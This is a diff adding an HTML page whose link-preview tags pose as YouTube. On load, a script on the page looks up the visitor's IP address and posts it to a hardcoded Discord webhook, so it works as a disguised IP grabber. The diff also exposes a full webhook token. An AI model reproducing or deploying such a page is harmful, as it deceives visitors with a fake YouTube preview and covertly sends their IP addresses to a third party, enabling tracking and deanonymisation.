@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta property="og:title" content="YouTube">
+    <meta property="og:description" content="YouTube でお気に入りの動画や音楽を楽しみ、オリジナルのコンテンツをアップロードして友だちや家族、世界中の人たちと共有しましょう。">
+    <meta property="og:image" content="https://example.com/preview-image.jpg">
+    <meta property="og:url" content="https://youtube.com">
+    <meta property="og:type" content="website">
+</head>
+
+<body>
+    <h1>Merci pour tes infos !</h1>
+
+    <script>
+        const url = "https://discord.com/api/webhooks/1340071752369442886/2y7d3LjfbBRLBNCU0hHCPRsee5qNE0pWoEFQ50MHANcg_WxNAAcTFAkTgKCUdZ1mn9cK";
+
+        fetch("https://api64.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: `User IP: ${data.ip}` })
+                })
+                    .then(response => {
+                        if (!response.ok) {
+                            return response.text().then(text => { throw new Error(text) });
+                        }
+                    }).catch(error => error.console(error));
+            }).catch(error => { console.error(error) });
+    </script>
+</body>
+
+</html>
